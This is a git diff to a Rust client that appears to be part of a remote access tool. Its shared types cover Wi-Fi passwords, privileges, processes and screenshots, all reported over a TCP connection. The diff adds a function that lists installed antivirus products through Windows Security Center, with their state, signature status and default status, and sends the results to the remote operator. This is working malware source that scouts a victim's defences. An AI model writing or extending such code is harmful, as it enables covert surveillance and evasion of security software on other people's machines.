@@ -1,6 +1,6 @@
 use shared::{
-    BoxLevel, ClientMessage, DiskInformation, Display, HardwareInformation, MemoryInformation, OsInformation, Privilege, ProcessInformation, SystemInformation, WifiPasswords, utils::send_message
-};
+    AntiVirus, BoxLevel, ClientMessage, DiskInformation, Display, HardwareInformation, MemoryInformation, OsInformation, Privilege, ProcessInformation, SystemInformation, WifiPasswords, utils::send_message
+}; 
 use std::net::TcpStream;
 use rfd::MessageDialog;
 use xcap::Monitor;
@@ -326,3 +326,96 @@ pub fn screenshot(conn: &mut TcpStream) -> Result<bool, String> {
 }
 
 // ---- Screenshot ---------------------------
+
+// ---- Av ---------------------------
+fn get_installed_avs() -> Result<Vec<AntiVirus>, String> {
+    use windows::Win32::{
+        System::Com::*,
+        System::SecurityCenter::*,
+    };
+
+    unsafe {
+        let hr = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
+
+        if hr.is_err() {
+            return Err(format!("Error initializing COM: {:?}", hr));
+        }
+
+        let result = {
+            let list: IWSCProductList =
+                CoCreateInstance(&WSCProductList, None, CLSCTX_INPROC_SERVER)
+                    .map_err(|e| format!("Error creating instance: {}", e))?;
+
+            list.Initialize(WSC_SECURITY_PROVIDER_ANTIVIRUS)
+                .map_err(|e| format!("Error initializing list: {}", e))?;
+
+            let count = list.Count()
+                .map_err(|e| format!("Error counting list of AVs: {}", e))?;
+
+            let mut avs = Vec::new();
+
+            for i in 0..count {
+                let product = list.get_Item(i as u32)
+                    .map_err(|e| format!("Error getting AV: {}", e))?;
+
+                let name = match product.ProductName() {
+                    Ok(name) => name.to_string(),
+                    Err(_) => continue,
+                };
+
+                let product_state = product.ProductState().ok();
+
+                let active = product_state == Some(WSC_SECURITY_PRODUCT_STATE_ON);
+
+                let state = match product_state {
+                    Some(WSC_SECURITY_PRODUCT_STATE_ON) => "on",
+                    Some(WSC_SECURITY_PRODUCT_STATE_OFF) => "off",
+                    Some(WSC_SECURITY_PRODUCT_STATE_SNOOZED) => "snoozed",
+                    Some(WSC_SECURITY_PRODUCT_STATE_EXPIRED) => "expired",
+                    _ => "unknown",
+                }.to_string();
+
+                let signatures_up_to_date = match product.SignatureStatus() {
+                    Ok(WSC_SECURITY_PRODUCT_UP_TO_DATE) => true,
+                    Ok(WSC_SECURITY_PRODUCT_OUT_OF_DATE) => false,
+                    _ => false,
+                };
+
+                let is_default = product.ProductIsDefault()
+                    .map(|b| b.as_bool())
+                    .unwrap_or(false);
+
+                avs.push(AntiVirus {
+                    name,
+                    active,
+                    is_default,
+                    state,
+                    signatures_up_to_date,
+                });
+            }
+
+            Ok(avs)
+        };
+
+        CoUninitialize();
+
+        result
+    }
+}
+
+
+pub fn av(conn: &mut TcpStream) -> Result<bool, String> {
+    let avs: Vec<AntiVirus> = match get_installed_avs() {
+        Ok(avs) => avs,
+        Err(e) => {
+            let _ = send_message(conn, &ClientMessage::Error(e));
+            return Ok(false);
+        }
+    };
+
+    let msg = ClientMessage::AntiVirus(avs);
+    let _ = send_message(conn, &msg);
+    Ok(true)
+}
+// ---- Av ---------------------------
+ 
